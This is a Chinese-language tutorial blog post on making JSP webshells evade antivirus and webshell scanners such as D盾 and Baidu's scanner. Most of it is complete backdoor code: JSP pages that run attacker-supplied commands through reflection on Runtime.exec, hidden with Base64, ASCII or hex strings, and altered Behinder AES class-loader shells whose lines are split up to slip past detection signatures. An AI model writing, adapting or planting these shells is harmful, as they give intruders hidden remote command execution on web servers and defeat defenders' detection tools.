# WebShell免杀之JSP


<meta name="referrer" content="no-referrer" />

## 前言

其他类型的webshell容易免杀的一个主要原因是有eval函数，能够把我们的加密几层后的payload进行解密然后用eval执行，从而绕过杀软的检测。

然而由于JSP的语法没有所谓的eval函数，不像php等语言那么灵活，变形困难，所以JSP的免杀马比较少，相关的文章也比较少。

能找到的公开文章中，LandGrey大佬的[这一篇文章](https://xz.aliyun.com/t/2342)写的非常好，利用Java反射机制和Java类加载机制来构造免杀的JSP后门。

但是文章中部分细节仅为一笔带过，对于没有学过JAVA的同学不太友好。并且这篇文章写在冰蝎出现之前，没有对冰蝎JSPshell免杀的相关内容。所以今天这篇文章就跟大家一起分享一下JSP的免杀姿势。

## 基础知识

### JSP标签

在JSP页面中嵌入java代码，首先要了解一下JSP标签的基本知识。

```
<%@ %>    页面指令，设定页面属性和特征信息
<% %>     java代码片段，不能在此声明方法
<%! %>    java代码声明，声明全局变量或当前页面的方法
<%= %>    Java表达式
```

### JSP中的字符串混淆方式

#### ASCII

```
String a=new String(new byte[] { 121, 122, 100, 100, 77, 114, 54 });
	System.out.println("ASCII: "+a);
```

#### HEX

```
import javax.xml.bind.DatatypeConverter;
      String b= new String(DatatypeConverter.parseHexBinary("797a64644d7236"));
      System.out.println("HEX: "+b);
```

#### BASE64

```
import sun.misc.BASE64Decoder;
    String c = new String(new BASE64Decoder().decodeBuffer("eXpkZE1yNg=="));
    System.out.println("BASE64: "+c);
```

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900428381-9770abbb-879b-47a6-957a-4020c8120607.png)

### 类反射

首先要知道为什么免杀需要用到类反射

**类反射可以把我们想要调用的函数或者类的名字放到一个字符串的位置。**

此时也就相当于我们实现了php中的变量函数，就可以利用base64编码或者hex编码等来混淆关键函数。

例子参考[大白话说Java反射](https:_www.cnblogs.com_chanshuyi_p_head_first_of_reflection)

#### 使用反射调用对象方法的步骤

```
Class clz = Class.forName("test.Apple"); // 获取类的 Class 对象实例
Constructor appleConstructor = clz.getConstructor(); // 根据 Class 对象实例获取 Constructor 对象
Object appleObj = appleConstructor.newInstance();// 使用 Constructor 对象的 newInstance 方法获取反射类对象
Method setPriceMethod = clz.getMethod("setPrice", int.class); // 获取方法的 Method 对象
setPriceMethod.invoke(appleObj, 14); // 利用 invoke 方法调用方法
```

如果没有构造函数的情况下就更简单了

```
Class clz = Class.forName("test.Apple"); // 获取类的 Class 对象实例
Object appleObj=clz.newInstance();// 直接获得clz类的一个实例化对象
Method setPriceMethod = clz.getMethod("setPrice", int.class); // 获取方法的 Method 对象
setPriceMethod.invoke(appleObj, 14); // 利用 invoke 方法调用方法
```

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900428491-64ccefe4-d2ad-4044-9efb-2dfd49af1889.png)

从图中可以看到，我们用类反射调用了Apple类中的setPrice跟getPrice方法。

其实也可以压缩一下写成一行的形式

```
Class.forName("test.Apple").getMethod("setPrice", int.class).invoke(Class.forName("test.Apple").newInstance(),20);
```

不过当然正常人是不会这么写的。

### 类加载

在LandGrey大佬的文章中提到的类加载的意思是将获得Class对象的方式由

Class rt= Class.forName("java.lang.Runtime"); 改成

Class rt = ClassLoader.getSystemClassLoader().loadClass("java.lang.Runtime");的形式。

但是冰蝎作者在[利用动态二进制加密实现新型一句话木马之Java篇](https://xz.aliyun.com/t/2744)中对于类加载是直接传送二进制字节码。

这也是为什么冰蝎能够实现不到1KB的JSP一句话的原因：**冰蝎可以做到动态解析二进制class字节码。**

学过java的同学应该都知道，java执行代码的时候都要先编译生成.class字节码文件，才能被jvm所执行。

那么也就是说，如果我们能够实现任意class文件的加载，也就相当于实现了php中的eval函数。

我们就用冰蝎中的例子

首先写一个命令执行的类，调一个calc，但是我们不写主函数，也就是说我们先不让他运行。

```
package test;
import java.io.IOException;
public class calc {
    @Override
    public String toString() {
        try {
            Runtime.getRuntime().exec("calc.exe");
        } catch (IOException e) {
            e.printStackTrace();
        }
        return "OK";
    }
}
```

在项目里生成之后，在out目录下可以看到编译好的二进制class文件。

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900428761-ea8dbfcf-abb8-465f-a0d1-43138b15fdd7.png)

然后把它base64，保存到文件里，去除多余的换行

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900428911-d0b2d108-e8d2-4599-ae87-43ec39551484.png)

接着生成一个loader类，用于加载我们的class文件

```
package test;
import sun.misc.BASE64Decoder;
public class loader {
    public static class Myloader extends ClassLoader //继承ClassLoader
    {
        public  Class get(byte[] b)
        {
            return super.defineClass(b, 0, b.length);
        }
    }
    public static void main(String[] args) throws Exception {
        String classStr="xxxxxxxxxxxxxxxxx"; // class的base64编码
        BASE64Decoder code=new sun.misc.BASE64Decoder();
        Class result=new Myloader().get(code.decodeBuffer(classStr));//将base64解码成byte数组，并传入t类的get函数
        System.out.println(result.newInstance().toString());
    }
}
```

运行后成功调用计算器。

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900429054-a642ed04-8d95-4a86-993c-0b2568cc797a.png)

我们用类加载的方式成功执行了系统命令。

## 对命令执行JSP一句话免杀

JAVA执行系统命令的核心就是`Runtime.getRuntime().exec(cmd)`

### 原型

```
<% if("023".equals(request.getParameter("pwd"))){ 
java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("i")).getInputStream();
int a = -1; byte[] b = new byte[2048]; out.print("
<pre>");
        while((a=in.read(b))!=-1){
            out.println(new String(b,0,a));
        }
        out.print("</pre>");
    }
%>
```

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900429209-d04cb3ef-d200-4b4b-a64c-cbd008e80021.png)

经过二分法分析，发现特征码是在`Runtime.getRuntime().exec`这一句。不知道什么是二分法分析的看我以前的两篇webshell免杀文章。

然后发现D盾对于JSP中只要有exec就会报一级。

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900429295-6062e8ff-65db-4154-806c-bffff73b509d.png)

那么我们就可以利用类反射的方法来隐藏掉exec函数。

### 类反射绕过

```
package test;
import java.lang.reflect.Method;
import java.util.Scanner;
public class Test {
    public static void main(String[] args) throws Exception {
        String op = "";
        Class rt = Class.forName("java.lang.Runtime"); //加载Runtime类
        Method gr = rt.getMethod("getRuntime");  //获取getRuntime方法
        Method ex = rt.getMethod("exec", String.class);  //获取exec方法
        Process e = (Process) ex.invoke(gr.invoke(null),  "cmd /c whoami"); //invoke 传参调用
        //以下代码是获取输出结果
        Scanner sc = new Scanner(e.getInputStream()).useDelimiter("\\A"); 
        op = sc.hasNext() ? sc.next() : op;
        sc.close();
        System.out.print(op);
    }
}
```

可以看到成功执行了whoami命令

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900429390-e2cc0856-3f3a-4d98-82d1-177cbb5707c1.png)

那么接下来就是把他放到jsp里面。

利用base64编码

```
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%@ page import="sun.misc.BASE64Decoder" %>
<%
    if(request.getParameter("cmd")!=null){
        BASE64Decoder decoder = new BASE64Decoder();
        Class rt = Class.forName(new String(decoder.decodeBuffer("amF2YS5sYW5nLlJ1bnRpbWU=")));
        Process e = (Process)
                rt.getMethod(new String(decoder.decodeBuffer("ZXhlYw==")), String.class).invoke(rt.getMethod(new
                        String(decoder.decodeBuffer("Z2V0UnVudGltZQ=="))).invoke(null, new
                        Object[]{}), request.getParameter("cmd") );
        java.io.InputStream in = e.getInputStream();
        int a = -1;
        byte[] b = new byte[2048];
        out.print("
<pre>");
        while((a=in.read(b))!=-1){
            out.println(new String(b));
        }
        out.print("</pre>");
    }
%>
```

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900429484-989ad2dd-05ea-4a53-9d39-615a59634344.png)

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900429573-4b451e63-266a-49f1-92bc-9f350ebc3ea5.png)

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900429667-305655ac-5adf-43a7-bfdb-f2b97e98d16d.png)

可以bypass D盾跟百度scanner，下面的都是免杀的，就不截图了。

利用ASCII编码

```
<%@ page contentType="text/html;charset=UTF-8"  language="java" %>
<%
    if(request.getParameter("cmd")!=null){
        Class rt = Class.forName(new String(new byte[] { 106, 97, 118, 97, 46, 108, 97, 110, 103, 46, 82, 117, 110, 116, 105, 109, 101 }));
        Process e = (Process) rt.getMethod(new String(new byte[] { 101, 120, 101, 99 }), String.class).invoke(rt.getMethod(new String(new byte[] { 103, 101, 116, 82, 117, 110, 116, 105, 109, 101 })).invoke(null), request.getParameter("cmd") );
        java.io.InputStream in = e.getInputStream();
        int a = -1;byte[] b = new byte[2048];out.print("
<pre>");
        while((a=in.read(b))!=-1){ out.println(new String(b)); }out.print("</pre>");
    }
%>
```

利用HEX编码

```
<%@ page contentType="text/html;charset=UTF-8" import="javax.xml.bind.DatatypeConverter" language="java" %>
<%
    if(request.getParameter("cmd")!=null){
        Class rt = Class.forName(new String(DatatypeConverter.parseHexBinary("6a6176612e6c616e672e52756e74696d65")));
        Process e = (Process) rt.getMethod(new String(DatatypeConverter.parseHexBinary("65786563")), String.class).invoke(rt.getMethod(new String(DatatypeConverter.parseHexBinary("67657452756e74696d65"))).invoke(null), request.getParameter("cmd") );
        java.io.InputStream in = e.getInputStream();
        int a = -1;byte[] b = new byte[2048];out.print("
<pre>");
        while((a=in.read(b))!=-1){ out.println(new String(b)); }out.print("</pre>");
    }
%>
```

### 寻找其他类

java中与执行命令相关的主要有两个类

```
java.lang.Runtime
java.lang.ProcessBuilder
```

我们上文中反射了Runtime类，那么同样我们也可以反射ProcessBuilder类。

原理是相同的，此处不再具体举例实现。

## 对于冰蝎JSP一句话的免杀

冰蝎JSP一句话的实现是我最佩服的一点，也是我今后想要加入到蚁剑中的功能。

由于冰蝎中改写的是Object类，所以几乎全部都是非敏感函数。目前各大杀软查杀的规则也并不是特别完善，其实特别容易免杀。

### 免杀D盾

经过二分法查找特征码，D盾对于冰蝎的查杀规则是这一句

```
new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);
```

为了简洁冰蝎作者把很多东西都写到一行里了。那么我们就把其中的变量拆出来试试。

把base64解密那一块给抠出来，实例化给decoder变量。

```
<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%>
<%!class U extends ClassLoader{U(ClassLoader c){super(c);}
public Class g(byte []b){return super.defineClass(b,0,b.length);}}%>
<%if(request.getParameter("pass")!=null){String k=(""+UUID.randomUUID()).replace("-","").substring(16);session.putValue("u",k);
out.print(k);return;}
Cipher c=Cipher.getInstance("AES");
c.init(2,new SecretKeySpec((session.getValue("u")+"").getBytes(),"AES"));
BASE64Decoder decoder=new sun.misc.BASE64Decoder();
new U(this.getClass().getClassLoader()).g(c.doFinal(decoder.decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);%>
```

就已经可以过D盾了

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900429763-051410dc-8afa-4cf4-b495-61b24f377d0c.png)

经过测试随便拆其他的也可以，再拆一个uploadString

```
<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%>
<%!class U extends ClassLoader{U(ClassLoader c){super(c);}
public Class g(byte []b){return super.defineClass(b,0,b.length);}}%>
<%if(request.getParameter("pass")!=null){String k=(""+UUID.randomUUID()).replace("-","").substring(16);session.putValue("u",k);
out.print(k);return;}
Cipher c=Cipher.getInstance("AES");
c.init(2,new SecretKeySpec((session.getValue("u")+"").getBytes(),"AES"));
 String uploadString= request.getReader().readLine();
new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(uploadString))).newInstance().equals(pageContext);%>
```

也可以免杀

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900429903-ea70127c-3c9f-4545-a98d-686dffe7ace6.png)

### 免杀百度scanner

拆最后一句免杀不了scanner

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900430015-44ed95d8-c898-4762-a78b-1260212b6be2.png)

经过测试scanner识别冰蝎的特征在这一句

```
c.init(2,new SecretKeySpec((session.getValue("u")+"").getBytes(),"AES"));
```

那就再把这一句给拆了

```
<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%>
<%!class U extends ClassLoader{U(ClassLoader c){super(c);}
public Class g(byte []b){return super.defineClass(b,0,b.length);}}%>
<%if(request.getParameter("pass")!=null){String k=(""+UUID.randomUUID()).replace("-","").substring(16);session.putValue("u",k);
out.print(k);return;}
Cipher c=Cipher.getInstance("AES");
SecretKeySpec sec=new SecretKeySpec((session.getValue("u")+"").getBytes(),"AES");
 c.init(2,sec);
 String uploadString= request.getReader().readLine();
new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(uploadString))).newInstance().equals(pageContext);%>
```

这时候就可以两个都免杀了

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900430104-50007ff0-0da4-49c0-82a6-0f9084263a7d.png)

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900430215-cbeac806-bb8e-4dba-bc1c-82848df984c1.png)

## 最后

其实还有很多方式值得去探索，就比如命令执行一句话那里。

我们可以在shell里只放类加载函数，而不含具体的payload。

然后写一个命令类，类里接收一个String类型的参数，作为所要执行的cmd语句。然后把它编译成二进制class，通过GET型或者POST型传过去。

其中cmd参数也从GET传入，经过shell发送到命令执行类中，就相当于实现了php中形如

`http://test.com/shell.php?func=system&cmd=whoami` 的回调函数后门。

其中有一个师傅已经实现了菜刀的远程加载类，文章地址：http://p2j.cn/?p=1627

不过所有的jar包都放在作者的博客上，也就是说每个shell都会先访问他的博客，还是建议自己搭建。

套路都是差不多的，自己多动手，想一想，你肯定能做的比我更好。
